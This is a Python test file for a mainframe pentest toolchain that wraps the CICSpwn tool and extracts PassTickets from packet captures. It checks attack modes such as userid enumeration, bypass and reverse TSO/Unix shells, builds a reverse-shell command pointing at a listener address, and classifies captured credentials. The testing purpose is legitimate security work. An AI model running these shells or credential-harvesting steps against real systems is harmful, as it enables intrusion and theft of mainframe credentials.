"""Tests for CICSpwn option building + PassTicket-from-pcap."""
import sys, os, tempfile
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from phosphor.toolchain import cicspwn as CP
from phosphor.toolchain import passticket as PT
from phosphor.toolchain.pcap import PcapWriter

_p=_f=0
def ok(n,c):
    global _p,_f
    if c: _p+=1; print("  ok  "+n)
    else: _f+=1; print(" FAIL "+n)

def test_cicspwn_actions():
    ok("many options exposed", len(CP.action_ids()) >= 12)
    ok("core modes present", {"info","all","userids","trans","files","tsqueues","bypass"} <= set(CP.action_ids()))
    ok("shell variants present", {"rev_tso","rev_unix","direct_unix","ftp","dummy"} <= set(CP.action_ids()))

def test_cicspwn_results_faithful():
    # build_results must set every dest CICSpwn.main() reads
    r = CP.build_results("192.168.0.248", 23, "files", applid="cicspa01")
    for dest in ("all_options","info","userids","trans","files","tsqueues","submit","applid","lhost","userid","password"):
        ok(f"results has {dest}", hasattr(r, dest))
    ok("applid upper-cased", r.applid == "CICSPA01")
    ok("action override applied", r.files is True and r.info is False)

def test_cicspwn_command_and_validate():
    cmd = CP.build_command("cicspwn.py","192.168.0.248",23,"rev_tso",lhost="10.0.0.5:4444")
    ok("command runs via PHOSPHOR emulator", "phosphor.run_cicspwn" in cmd and "--action rev_tso" in cmd)
    ok("shell action needs lhost", CP.validate("rev_tso", None) is not None)
    ok("info action has no requirement", CP.validate("info", None) is None)

def test_passticket_from_pcap():
    p = os.path.join(tempfile.mkdtemp(),"c.pcap")
    w = PcapWriter(p, server_ip="192.168.0.248", server_port=23)
    w.packet("OUT","IBMUSER".encode("cp037")); w.packet("OUT","N4K7QP2M".encode("cp037")); w.close()
    fields = PT.scan_pcap_file(p)
    kinds = {f.text:f.kind for f in fields}
    ok("passticket flagged from pcap", kinds.get("N4K7QP2M")=="passticket")
    ok("userid classed as password", kinds.get("IBMUSER")=="password")

if __name__=="__main__":
    for fn in (test_cicspwn_actions,test_cicspwn_results_faithful,test_cicspwn_command_and_validate,test_passticket_from_pcap):
        print("\n"+fn.__name__); fn()
    print(f"\nCICSpwn + PassTicket-pcap: {_p} passed, {_f} failed")
    sys.exit(1 if _f else 0)
